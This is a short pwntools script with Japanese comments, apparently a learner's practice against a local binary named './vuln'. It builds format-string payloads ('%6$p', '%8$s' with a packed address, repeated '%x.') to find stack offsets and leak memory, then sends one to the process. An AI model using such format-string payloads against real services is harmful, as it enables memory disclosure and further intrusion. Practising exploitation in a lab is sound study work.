# %6$p で6番目の値を取り出す
import pwn


def test():
    payload = pwn.p32(0x41424344)
    payload += b'|%6$p'
    return payload


# 0x804800からELFのマジックが始まる?
def test2():
    payload = b'%8$s||||'
    payload += pwn.p32(0x8048000)
    return payload


# test2()の意味がわからなかった
def test3():
    payload = b'%x.'

    for i in range(7):
        payload += b'%x.'

    payload += b'||||'

    return payload


if __name__ == "__main__":
    p = pwn.process('./vuln')

    payload = test2()

    p.sendline(payload)
    pwn.log.info(p.clean())
